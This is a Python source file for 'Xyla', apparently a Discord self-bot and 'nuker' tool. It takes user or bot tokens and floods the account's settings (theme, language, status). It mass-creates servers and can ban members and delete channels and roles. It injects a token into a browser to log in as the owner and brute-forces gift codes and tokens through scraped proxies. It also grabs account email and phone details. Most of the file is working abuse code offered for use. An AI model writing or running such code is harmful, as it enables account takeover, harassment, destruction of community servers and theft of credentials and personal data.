#!/usr/bin/python3
import string
import random
from gtts import gTTS
import pafy
import subprocess
from threading import *
from random import randint
import base64
import asyncio
import threading
from itertools import cycle
import requests, os, sys, discord, time, os.path
from discord.ext import commands
import colorama, os, json
from colorama import Fore, Style
from lxml.html import fromstring
from selenium import webdriver
sys.tracebacklimit = 0

os.system('pip install -r requirements.txt')

def Spinner():
    os.system(f'cls & mode 85,20 & title Xyla 1.0.0 - Loading . . .') 
    l = ['|', '/', '-', '\\', '-']
    for i in l+l+l:
        sys.stdout.write(f'\rWelcome to Xyla Baboon...'+i)
        sys.stdout.flush()
        time.sleep(0.2)
Spinner()

os.system(f'cls & mode 85,20 & title Xyla - Login.') 
print(f'''
\033[0;31m                      ═╗ ╦╦ ╦╦  ╔═╗  ╔╦╗╦ ╦╦ ╔╦╗╦  ╔╦╗╔═╗╔═╗╦  
\033[90m                      ╔╩╦╝╚╦╝║  ╠═╣  ║║║║ ║║  ║ ║───║ ║ ║║ ║║  
{Fore.WHITE}                      ╩ ╚═ ╩ ╩═╝╩ ╩  ╩ ╩╚═╝╩═╝╩ ╩   ╩ ╚═╝╚═╝╩═╝

DISCLAIMER: THIS IS A DISCORD RELIANT TOOL YOU MUST HAVE A DISCORD ACCOUNT

 ''')
tokentype = input(f"Bot or User token <bot/user>: ")
while tokentype !="bot" and tokentype != "user":
  print(f"{Fore.RED}Invalid option")
  tokentype = input(f"\nBot or User token <bot/user>: ")

token = input(f'TOKEN : ')
if tokentype == "bot":
  type = "Bot"
  headers = {'Authorization': f'Bot {token}'}
elif tokentype == "user":
  type = "Human"
  headers = {'Authorization': f'{token}'}

client = commands.Bot(command_prefix = "bbc", intents = discord.Intents.all(), self_bot=True)
client.remove_command('help')

colorama.init()
with open('./files/config.json') as f:
    data = json.load(f)
    servername= data["SERVERNAME"]
headers = {
 'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
 'Content-Type': 'application/json',
 'Authorization': token,
}


#NUKE ACTIONS

def ban(guild_id, member):
  while True:
    r = requests.put(f"https://discord.com/api/v8/guilds/{guild_id}/bans/{member}", headers=headers)
    if 'retry_after' in r.text:
      time.sleep(r.json()['retry_after'])
    else:
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"\t\t[-] Banned {member.strip()}\n")
        break
      else:
        break
      
request = requests.Session()
def tokenLogin():
    token = input('token: ')
    src = request.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
    if src.status_code == 403:
      print("Token Is Invalid")
      xyla()
    elif src.status_code == 401:
      print("Token Is Invalid")
      xyla()
    else:
      opts = webdriver.ChromeOptions()
      opts.add_experimental_option("detach", True)
      driver = webdriver.Chrome('chromedriver.exe', options=opts)
      script = """
              function login(token) {
              setInterval(() => {
              document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
              }, 50);
              setTimeout(() => {
              location.reload();
              }, 2500);
              }
              """
      driver.get("https://discord.com/login")
      driver.execute_script(script + f'\nlogin("{token}")')

def deletechannels(guild_id, channel):
  while True:
    r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
    if 'retry_after' in r.text:
      time.sleep(r.json()['retry_after'])
    else:
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"\t\t[-] Deleted Channel {channel.strip()}\n")
        break
      else:
        break
                        
def deleteroles(guild_id, role):
  while True:
    r = requests.delete(f"https://discord.com/api/v8/guilds/{guild_id}/roles/{role}", headers=headers)
    if 'retry_after' in r.text:
      time.sleep(r.json()['retry_after'])
    else:
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"\t\t[-] Deleted Role {role.strip()}\n")
        break
      else:
        break

#TOKEN FUCK
def tokenfuck():
      global headers
      payload = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "idle"
      }
      print(f"\033[0;37m[\033[36m+\033[0;37m]\033[0;37m Fucked Token.")
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
      to_back()
#SEIZURE
def seizure():
    global headers
    payload = {
      'theme': "dark"
      }
    payload2 = {
      'theme': "light"
      }
    for i in range(100):
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
      print(f"\033[0;37m[\033[36m+\033[37m]\033[37m Sent Seizure.")
    to_back()
#LANG RAPE
def langrape():
    global headers
    payload1 = {
          'locale': "ro"
      }
    payload2 = {
          'locale': "ja"
      }
    payload3 = {
          'locale': "fr"
      }
    for i in range(100):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload1)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
        print(f"\033[0;37m[\033[0;36m+\033[0;37m]\033[0;37m Raping Language.")
    to_back()
#STATUS RAPE
def statusrape():
      global headers
      payload = {
          'status': "dnd"
      }
      payload2 = {
          'status': "idle"
      }
      payload3 = {
          'status': "invisible"
      } 
      payload4 = {
          'status': "online"
      }
      for i in range(100):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload4)
        print(f"\033[0;37m[\033[0;36m+\033[0;37m]\033[0;37m Raping Status.")
      to_back()
#SERVER SPAMMER
def serverspam():
    global servername
    global headers
    guild = {
    'name': f"{servername}"
    } 
    for i in range(100):
     requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
     print(f"\033[0;37m[\033[36m+\033[0;37m]\033[37m Created Server Named\033[0m:\033[36m {servername}")
    to_back()
#DESTROY TOKEN
def destroy():
  threading.Thread(target=serverspam).start()
  threading.Thread(target=statusrape).start()
  threading.Thread(target=seizure).start()
  threading.Thread(target=langrape).start()

@client.event
async def on_ready():
  os.remove("servers.txt")
  for guild in client.guilds:
    server = client.get_guild(guild.id)
    f = open("servers.txt", "a+")
    f.write(f"{server.id}\n")
  clear()
  await xyla() 
  
def clear():
  if sys.platform.startswith("win"):
    os.system('cls')
  elif sys.platform == 'linux' or 'darwin':
    os.system('clear')

# also completely bullshit
def nitrogen():
    os.system('cls' if os.name == 'nt' else 'clear')
    while True:
        code = ''.join(random.choices(
            string.ascii_uppercase + string.digits + string.ascii_lowercase,
            k=16
        ))

        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
        s = requests.session()
        response = s.get(url)

        nitro = f'{Fore.LIGHTBLACK_EX}https://discord.gift/{Fore.RESET}' + code

        if 'subscription_plan' in response.text:
            print(f'{Fore.LIGHTGREEN_EX}Valid code{Fore.RESET} | {nitro}')
            print("FOUND CODE")
            with open("code.txt", "w") as f:
                f.write(nitro)
            break

        else:
            print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {nitro}')
            continue

def get_proxies():
    url = 'https://sslproxies.org/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0],
                             i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies

# this is completely dogshit btw
def tokengen():
    N = input("How many you want?: ")
    count = 0
    current_path = os.path.dirname(os.path.realpath(__file__))
    url = "https://discordapp.com/api/v6/users/@me/library"

    while(int(count) < int(N)):
        tokens = []
        base64_string = "=="
        while(base64_string.find("==") != -1):
            sample_string = str(
                randint(
                    000000000000000000,
                    999999999999999999))
            sample_string_bytes = sample_string.encode("ascii")
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode("ascii")
        else:
            token = base64_string + "." + random.choice(
                string.ascii_letters).upper() + ''.join(
                random.choice(
                    string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(
                random.choice(
                    string.ascii_letters + string.digits) for _ in range(27))
            count += 1
            tokens.append(token)
        proxies = get_proxies()
        proxy_pool = cycle(proxies)

        for token in tokens:
            proxy = next(proxy_pool)
            header = {
                "Content-Type": "application/json",
                "authorization": token
            }
            r = requests.get(url, headers=header, proxies={"http": proxy})
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | {token}")
                with open("workingtokens.txt", "a") as f:
                    f.write(token + "\n")

            elif "rate limited." in r.text:
                print("[-] You are being rate limited.")
                xyla()

            else:
                print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {token}')
        tokens.remove(token)

def geoip(): 
  ip = input(f"Provide an ip to get information on: ")
  url = f"https://api.hackertarget.com/geoip/?q={ip}"
  response = requests.get(url)
  if response.status_code == 200:
    request = requests.get(url)
    response = request.text
    for line in response.splitlines():
      print(f'{line}')
  else:
    print(f"Api Error try again later")

def tokeninfo():
    if type == 'Bot':
      print(f"You can't use the token info command with a bot token")
    req = requests.get("https://discord.com/api/v9/users/@me", headers = {"authorization": token}).json()
    username = req["username"] + "#" + req["discriminator"]
    user_id = req["id"]
    email = req["email"]
    email_verified = req["verified"]
    phone_number = req["phone"]
    mfa = req["mfa_enabled"]
    public_flags = req["public_flags"]
    print(f"""
          User Information
          Username: {username}
          User id: {user_id}
          Email: {email}
          Email verified: {email_verified}
          Phone number: {phone_number}
          MFA: {mfa}
          Public flags: {public_flags}
""") 

async def Servers():
  index = 0
  for guild in client.guilds:
    index += 1
    guilds = len(client.guilds)
    channel = guild.text_channels[0]
    members = len(guild.members)
    print(f"{index}/{guilds} | Guild Name: {guild.name} | Guild ID: {guild.id} | Guild Member count: {members}")
  input(f"Tasks Completed\nPress Enter to continue")
  os.system('cls' if os.name == 'nt' else 'clear')
  await xyla()

def directory_finder():
  print('you have 10 seconds to insert a directory... be quick')
  done = subprocess.Popen(['powershell.exe', './directory_validator.ps1'], stdout=sys.stdout)
  return done

def password_gen():
  print('\nyou have 10 seconds to run this >_< because i hate you')
  done = subprocess.Popen(['powershell.exe', './files/password_gen.exe'], stdout=sys.stdout)
  return done

def credit():
  print(Fore.RED + '      Made by Avale & Loopy, do not skid >_< or else...')      

async def tts():
  text = input('text: ')
  save = input('name of file?')
  lang = 'en'
  obj = gTTS(text = text, lang = lang, slow=False)
  saved_file = obj.save(f'{save}.wav')
  os.system(f'mpg321{saved_file}')
  await xyla()

def downloader():
  link = input('Video: ') # link of yt vid
  vid = pafy.new(link) # Gets link
  best = vid.getbest() # Gets best extension and res
  print(best.resolution, best.extension)
  best.download()

def sitegrabber():
  r = input('URL: ')

  f = requests.get(r)

  print(f)

  print({f.content}, file=open ("source.txt", 'a'))

# i know this is god awful
async def to_back():
 await xyla()
async def xyla():
  os.system(f'cls & mode 85,20 & title Xyla - Menu') 
  text = f'''
{Fore.RED} {Style.DIM}

                               ▐▄• ▄  ▄· ▄▌▄▄▌   ▄▄▄·   
                                █▌█▌▪▐█▪██▌██•  ▐█ ▀█
                                ·██· ▐█▌▐█▪██▪  ▄█▀▀█ 
                               ▪▐█·█▌ ▐█▀·.▐█▌▐▌▐█ ▪▐▌
                               •▀▀ ▀▀  ▀ • .▀▀▀  ▀  ▀ 

                                {Fore.WHITE}avale#1234{Fore.RED}, {Fore.WHITE}loopy#0001{Fore.RED}
       ╔═════════════════════════════════════════════════════════════════════╗
      ║ {Fore.WHITE}[{Fore.RED}{Style.DIM}1{Fore.WHITE}]{Fore.RED}{Style.DIM}Nitro Gen           ║{Fore.WHITE}[{Fore.RED}{Style.DIM}6{Fore.WHITE}]{Fore.RED}{Style.DIM} Server Spammer    ║{Fore.WHITE}[{Fore.RED}{Style.DIM}11{Fore.WHITE}]{Fore.RED} {Style.DIM}Directory Finder  ║
      ║ {Fore.WHITE}[{Fore.RED}{Style.DIM}2{Fore.WHITE}]{Fore.RED}{Style.DIM}Token Info Grabber  ║{Fore.WHITE}[{Fore.RED}{Style.DIM}7{Fore.WHITE}]{Fore.RED}{Style.DIM} Token Login       ║{Fore.WHITE}[{Fore.RED}{Style.DIM}12{Fore.WHITE}]{Fore.RED} {Style.DIM}Password Gen      ║
      ║ {Fore.WHITE}[{Fore.RED}{Style.DIM}3{Fore.WHITE}]{Fore.RED}{Style.DIM}Token Gen           ║{Fore.WHITE}[{Fore.RED}{Style.DIM}8{Fore.WHITE}]{Fore.RED}{Style.DIM} Server List       ║{Fore.WHITE}[{Fore.RED}{Style.DIM}13{Fore.WHITE}]{Fore.RED} {Style.DIM}Text To Speech    ║
      ║ {Fore.WHITE}[{Fore.RED}{Style.DIM}4{Fore.WHITE}]{Fore.RED}{Style.DIM}Ip Info Lookup      ║{Fore.WHITE}[{Fore.RED}{Style.DIM}9{Fore.WHITE}]{Fore.RED}{Style.DIM} Credits           ║{Fore.WHITE}[{Fore.RED}{Style.DIM}14{Fore.WHITE}]{Fore.RED} {Style.DIM}YT Downloader     ║
      ║ {Fore.WHITE}[{Fore.RED}{Style.DIM}5{Fore.WHITE}]{Fore.RED}{Style.DIM}Account Nuker       ║{Fore.WHITE}[{Fore.RED}{Style.DIM}10{Fore.WHITE}]{Fore.RED}{Style.DIM} Exit             ║{Fore.WHITE}[{Fore.RED}{Style.DIM}15{Fore.WHITE}]{Fore.RED} {Style.DIM}Site SRC Grabber  ║
       ╚═════════════════════════════════════════════════════════════════════╝


'''
  x = text.center(60)
  print(x)
  blackie = input(Fore.RED + Style.DIM + f'''{Fore.WHITE}┌──{Fore.RED}{Style.DIM}({Fore.WHITE}root@xyla{Fore.RED}{Style.DIM}) -{Fore.WHITE}[{Fore.RED}{Style.DIM}!{Fore.WHITE}]:
└─{Fore.RED}{Style.DIM}${Fore.WHITE}: ''')
  if blackie == '1':
    clear()
    nitrogen()

  if blackie == '2':
    clear()
    tokeninfo()
    asyncio.sleep(3)

  if blackie == '3':
    clear()
    tokengen()
    asyncio.sleep(3)

  if blackie == '4':
    clear()
    geoip()
    asyncio.sleep(3)

  if blackie == '5':
    clear()
    destroy()
    asyncio.sleep(3)

  if blackie == '6':
    clear()
    serverspam()
    asyncio.sleep(3)

  if blackie == '9':
    clear()
    credit()
    time.sleep('5')
    await xyla()

  if blackie == '7':
    clear()
    tokenLogin()
    asyncio.sleep(3)

  if blackie == '10':
    clear()
    exit()

  if blackie == '8':
    clear()
    await Servers()

  if blackie == '11':
    directory_finder()
    time.sleep(10)
    input("\ndirectory finder finished . . . press enter\n")
    clear()
    await xyla()

  if blackie == '12':
    password_gen()
    time.sleep(10)
    input("\npassword generator finished . . . press enter\n")
    clear()
    await xyla()

  if blackie == '13':
    await tts()
    time.sleep(10)
    input("\nText To Speech finished . . . press enter\n")
    clear()
    await xyla()

  if blackie == '14':
    downloader()
    time.sleep(3)
    input("\nDownloader finished . . . press enter\n")
    clear()
    await xyla()

  if blackie == '15':
    sitegrabber()
    time.sleep(30)
    input("\nfinished . . . press enter\n")
    clear()
    await xyla()

if type == "Human":
  try:
    client.run(token, bot=False)
  except discord.errors.LoginFailure as e:
    print(f"Invalid Token: {e}")
    
elif type == "Bot":
  try:
    client.run(token, bot=True)
  except discord.errors.LoginFailure as e:
    print(f"Invalid Token: {e}")